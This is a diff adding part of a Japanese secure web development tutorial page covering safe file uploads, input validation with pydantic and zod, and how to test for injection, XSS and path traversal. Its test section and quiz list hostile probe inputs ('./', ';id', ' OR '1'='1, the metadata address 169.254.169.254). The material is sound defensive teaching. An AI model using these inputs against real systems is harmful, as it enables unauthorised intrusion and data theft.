+<div class="why"><code>Content-Type</code> と拡張子は、送る側が好きに書けます。</div></div>
+  <div class="ok"><div class="lbl">✓ 安全な例：中身で判定し、名前はサーバーが決める</div>
+<pre class="code"><code><span class="lang">Python（Flask + Pillow）</span>f = request.files["photo"]
+if request.content_length &gt; 5 * 1024 * 1024: abort(413)  <span class="c"># サイズ上限</span>
+try:
+    img = Image.open(f.stream); img.verify()               <span class="c"># 中身が画像か</span>
+except Exception: abort(400)
+f.stream.seek(0)                                            <span class="c"># verify() の後は先頭に戻す</span>
+<span class="ok">name = f"{uuid.uuid4()}.png"</span>                                <span class="c"># 名前はサーバーが付ける</span>
+Image.open(f.stream).convert("RGB").save(os.path.join(UPLOAD_DIR, name))  <span class="c"># 再エンコードして保存</span></code></pre>
+<div class="why">保存先は Web サーバーが直接実行・配信しない場所（または実行を無効にしたオブジェクトストレージ）にし、配信時は <code>Content-Disposition: attachment</code> と <code>X-Content-Type-Options: nosniff</code> を付けます。</div></div>
+</div>
+
+<h2 id="validation">7. 入力検証の設計</h2>
+<p>ここまでの対策は「出力先ごとに値として渡す」ことでした。それとは別に、入口で<b>入力の形を検証して、想定外のものを弾く</b>ことが要ります。2つは役割が違い、<b>両方要ります</b>。</p>
+<div class="box hook">
+  <div class="box-title"><span class="em">🔑</span>覚え方：検証は「形」、エスケープは「出力先」</div>
+  <p><b>検証</b>は入口で「数値か・長さは・範囲は・選択肢の中か」を見て、違えば 400 で返す。<b>エスケープ</b>は出口で「この出力先ではこの記号が危ない」を無害化する。<code>O'Brien</code> さんの名前は<b>検証は通すべき</b>（正当な入力）で、SQL には<b>プレースホルダで渡すべき</b>。検証だけで記号を全部禁止すると正当な利用者が困り、エスケープだけだと「数量 −1」のような論理の穴が残ります。</p>
+</div>
+<ul>
+  <li><b>許可リストで書く</b>：「<code>&lt;</code> を含まない」ではなく「英数字 1〜20 文字」「S・M・L のいずれか」「1 以上 100 以下の整数」のように、許す形を決める。</li>
+  <li><b>サーバー側で行う</b>：画面側の検証は利用者の操作ミス防止。攻撃者は画面を使わない。</li>
+  <li><b>正規化してから検証する</b>：前後の空白を除く、Unicode の全角・半角を統一（NFKC）、大文字小文字をそろえる。検証の後に変換すると、変換で危険な形に化けることがある。</li>
+  <li><b>スキーマで一元化する</b>：項目ごとに手書きせず、スキーマ定義で型・範囲・長さをまとめて検証する。</li>
+</ul>
+<div class="compare">
+  <div class="ok"><div class="lbl">✓ Python：pydantic</div>
+<pre class="code"><code><span class="lang">Python</span>from typing import Literal
+from pydantic import BaseModel, Field
+
+class OrderIn(BaseModel):
+    quantity: int = Field(ge=1, le=100)
+    note: str = Field(max_length=200)
+    size: Literal["S", "M", "L"]
+
+order = OrderIn.model_validate(request.get_json())  <span class="c"># 違反なら ValidationError</span></code></pre>
+<div class="why">型が合わない・範囲外・選択肢外を、処理に入る前にまとめて弾けます。</div></div>
+  <div class="ok"><div class="lbl">✓ JavaScript：zod</div>
+<pre class="code"><code><span class="lang">JavaScript</span>import { z } from "zod";
+
+const Order = z.object({
+  quantity: z.number().int().min(1).max(100),
+  note: z.string().max(200),
+  size: z.enum(["S", "M", "L"]),
+});
+
+const order = Order.parse(req.body);  <span class="c">// 違反なら ZodError</span></code></pre>
+<div class="why">定義にない項目は捨てる設定にすると、<a href="04-auth-session.html#authz">マスアサインメント</a>の対策にもなります。</div></div>
+</div>
+
+<h2 id="testing">8. 確かめ方</h2>
+<div class="steps-grid">
+  <div class="step"><span class="k">手で（5分）</span><b>記号を入れてみる</b><p>自分の環境の入力欄・URL パラメータに <code>'</code>、<code>"</code>、<code>&lt;b&gt;x&lt;/b&gt;</code>、<code>../</code>、<code>;id</code> を入れる。エラーの詳細が出る・太字になる・別のファイルが返る、なら穴。</p></div>
+  <div class="step"><span class="k">自動テスト</span><b>異常系をテストに入れる</b><p>「<code>'</code> 入りの名前で検索しても 200 で正しく0件」「<code>../</code> 入りのファイル名は 400」「数量 0 と 101 は 400」を、ユニットテストや API テストに書いておく。</p></div>
+  <div class="step"><span class="k">SAST</span><b>コードを機械に読ませる</b><p>Semgrep や CodeQL（GitHub の code scanning）は、文字列連結の SQL、<code>shell=True</code>、<code>innerHTML</code> への代入を見つけられる。CI に入れる（<a href="09-secure-process.html#automation">第9章</a>）。</p></div>
+  <div class="step"><span class="k">DAST</span><b>動かして攻撃を試す</b><p>OWASP ZAP などは、実際にリクエストを送って XSS や SQL インジェクションを探す。<b>自分の環境に対してだけ</b>使う。本番や他人のサイトには向けない。</p></div>
+</div>
+<div class="box warn">
+  <div class="box-title"><span class="em">⚠️</span>間違えやすい点：対策したつもり</div>
+  <ul style="margin:0">
+    <li>「入力時に <code>'</code> を削除している」→ 正当な入力（<code>O'Brien</code>）が壊れるうえ、別の記号で突破される。<b>プレースホルダ</b>に置き換える。</li>
+    <li>「WAF を入れたから大丈夫」→ WAF は既知のパターンを止める保険。コードの穴は残ったまま。</li>
+    <li>「ORM だから安全」→ 生 SQL 機能に連結で入力を混ぜれば同じ。<code>raw</code>・<code>Unsafe</code> と名の付く関数を検索する。</li>
+    <li>「社内ツールだから XSS は気にしない」→ 管理者のセッションを盗まれると被害は最大になる。</li>
+  </ul>
+</div>
+
+<div class="box science">
+  <div class="box-title"><span class="em">🔬</span>出典・さらに読む</div>
+  <ul style="margin:0">
+    <li>IPA「<a href="https://www.ipa.go.jp/security/vuln/websecurity.html">安全なウェブサイトの作り方</a>」第1章：SQL インジェクション、OS コマンド・インジェクション、パス名パラメータの未チェック、クロスサイト・スクリプティング（日本語・無料）</li>
+    <li>OWASP Cheat Sheet：<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">SQL Injection Prevention</a>、<a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">XSS Prevention</a>、<a href="https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html">Input Validation</a>、<a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">SSRF Prevention</a>、<a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">File Upload</a></li>
+    <li>MDN「<a href="https://developer.mozilla.org/ja/docs/Web/HTTP/CSP">コンテンツセキュリティポリシー (CSP)</a>」（日本語）</li>
+  </ul>
+</div>
+
+<div class="box kotoba">
+  <div class="box-title"><span class="em">📝</span>用語の補足</div>
+  <dl class="words">
+    <dt>プレースホルダ</dt><dd>SQL 文の中の <code>?</code> や <code>%s</code>。値はこの位置に「値として」別渡しされる。パラメータ化クエリ、バインド変数とも呼ぶ。</dd>
+    <dt>生 SQL</dt><dd>ORM を通さず、SQL 文を直接書いて実行すること。必要なときもあるが、入力はプレースホルダで渡す。</dd>
+    <dt>RCE</dt><dd>リモートコード実行。外から任意のプログラムをサーバーで実行できてしまうこと。OS コマンドインジェクションの帰結。</dd>
+    <dt>正規化</dt><dd>表記のゆれ（全角・半角、大文字・小文字、<code>..</code> を含むパス）を1つの形にそろえること。検証の前に行う。</dd>
+    <dt>サニタイズ</dt><dd>HTML から危険なタグ・属性を取り除いて安全な HTML にすること。自作せず DOMPurify などを使う。エスケープとは別物。</dd>
+    <dt>オリジン</dt><dd>スキーム・ホスト・ポートの組（<code>https://example.com:443</code>）。ブラウザはこれが同じかどうかで権限を分ける。CSP の <code>'self'</code> は同じオリジンのこと。</dd>
+    <dt>WAF</dt><dd>Web Application Firewall。HTTP リクエストの内容を見て、既知の攻撃パターンを遮断する装置・サービス。保険であり、コードの修正の代わりにはならない。</dd>
+  </dl>
+</div>
+
+<div class="recall">
+  <h2>🧠 想起練習</h2>
+  <p class="muted">本文を見ずに答えを思い出してから、各項目を開いて確認してください。</p>
+  <details class="q"><summary>インジェクション系の脆弱性に共通する原理を一言で。対策の共通形は？</summary><div class="a">データと命令の混同（入力を文字列連結で命令に混ぜる）。対策は「入力を値として別に渡す仕組み（プレースホルダ・引数配列・自動エスケープ）」と「入力の形を許可リストで検証」。</div></details>
+  <details class="q"><summary>パスワード欄に <code>' OR '1'='1</code> を入れるとログインできてしまう理由は？</summary><div class="a">SQL を文字列連結で作っているため、<code>'</code> が文字列の終わりになり、条件が「または 1=1（常に真）」に書き換わるから。</div></details>
+  <details class="q"><summary>SQL インジェクションの根本対策と、Python・Node での書き方は？</summary><div class="a">プレースホルダ。Python sqlite3 は <code>execute("... = ?", (v,))</code>、psycopg は <code>%s</code>、Node mysql2 は <code>execute("... = ?", [v])</code>。</div></details>
+  <details class="q"><summary>ORM を使っていれば SQL インジェクションは起きないか。プレースホルダにできない部分はどうするか。</summary><div class="a">起きる。生 SQL 機能に文字列連結で入力を混ぜれば同じ穴。テーブル名・列名（ORDER BY）は値渡しできないので、対応表（許可リスト）から選ぶ。</div></details>
+  <details class="q"><summary>OS コマンドを呼ぶときの安全な書き方は？最善は？</summary><div class="a">引数を配列で渡し、シェルを経由しない（<code>subprocess.run([...])</code>、<code>execFile</code>）。入力の形も検証する。最善はコマンドを呼ばずライブラリを使うこと。</div></details>
+  <details class="q"><summary>パストラバーサルの対策を2つ。</summary><div class="a">利用者にファイル名を決めさせず ID から対応表で引く。どうしても名前を受けるなら <code>realpath</code> で正規化して基準ディレクトリ配下かを確認する。</div></details>
+  <details class="q"><summary>SSRF とは何か。なぜクラウドで深刻か。対策は？</summary><div class="a">サーバーに任意の URL を取りに行かせ、内部 API やメタデータサービス（169.254.169.254）にアクセスさせる攻撃。クラウドの認証情報が盗まれる。対策は接続先ホストの許可リスト、内部アドレスの拒否、リダイレクトの再検証、IMDSv2。</div></details>
+  <details class="q"><summary>XSS の3種類と、それぞれ仕込む場所は？</summary><div class="a">反射型（URL パラメータ）、格納型（DB に保存される投稿）、DOM 型（ブラウザ側 JS が innerHTML などに入れる）。</div></details>
+  <details class="q"><summary>XSS でできることを3つ。</summary><div class="a">セッション Cookie の窃取（なりすまし）、偽ログイン画面の表示、利用者になりすました操作。</div></details>
+  <details class="q"><summary>XSS を防ぐ正しい方法と、使ってはいけない書き方は？「<code>&lt;script&gt;</code> を削除」は対策になるか。</summary><div class="a">テンプレートの自動エスケープに任せる・<code>textContent</code> を使う。<code>|safe</code>、<code>innerHTML</code>、<code>dangerouslySetInnerHTML</code>、<code>v-html</code> は使わない。タグ削除はブロックリストで回避され放題なので対策にならない。HTML が必要なら DOMPurify。</div></details>
+  <details class="q"><summary>CSP とは何か。本番で有効にする前にすることは？</summary><div class="a">実行してよいスクリプトの出所をサーバーがブラウザに指示する応答ヘッダー。XSS の保険。まず Content-Security-Policy-Report-Only で違反を集め、インラインスクリプトを外部化か nonce 化してから有効にする。</div></details>
+  <details class="q"><summary>入力検証とエスケープの違いは？なぜ両方要るか。</summary><div class="a">検証は入口で「形」（型・長さ・範囲・選択肢）を見て弾く。エスケープは出口で出力先に合わせて記号を無害化する。検証だけだと正当な <code>O'Brien</code> を弾くか記号漏れが出る。エスケープだけだと「数量 −1」のような論理の穴が残る。</div></details>
+</div>
+
+<div id="study-log"></div>
+<nav id="pager"></nav>
+</main>
+<script src="../assets/site.js"></script>
+<script>
+(function () {
+  // エスケープ体験：結果はすべて textContent で表示する（innerHTML は使わない）
+  var input = document.getElementById("esc-in");
+  var raw = document.getElementById("esc-raw"), escaped = document.getElementById("esc-escaped");
+  var sql = document.getElementById("esc-sql"), ph = document.getElementById("esc-ph"), note = document.getElementById("esc-note");
+  function escapeHtml(s) {
+    return s.replace(/[&<>"']/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]; });
+  }
+  function render() {
+    var v = input.value;
+    raw.textContent = "<p>こんにちは、" + v + "さん</p>";
+    escaped.textContent = "<p>こんにちは、" + escapeHtml(v) + "さん</p>";
+    sql.textContent = "SELECT * FROM users WHERE name = '" + v + "'";
+    ph.textContent = "SQL 文：SELECT * FROM users WHERE name = ?\n値　　：" + JSON.stringify(v) + "\n→ 値はどんな文字列でも「名前」としてだけ比較される";
+    var msgs = [];
+    if (/[<>]/.test(v)) msgs.push("「<」「>」が入っています。左上ではタグとして解釈され、右上では文字 &lt; &gt; として表示されます。");
+    if (/'/.test(v)) msgs.push("「'」が入っています。左下では文字列の区切りが壊れて SQL の意味が変わり、右下では値の中の1文字にすぎません。");
+    if (!msgs.length) msgs.push("危険な記号は入っていません。それでも、プレースホルダと自動エスケープを常に使う書き方にしておくのが正解です。");
+    note.textContent = msgs.join(" ");
+  }
+  input.addEventListener("input", render);
+  document.querySelectorAll("[data-sample]").forEach(function (b) {
+    b.addEventListener("click", function () { input.value = b.getAttribute("data-sample"); render(); });
+  });
+  render();
+})();
+</script>
+</body>
+</html>
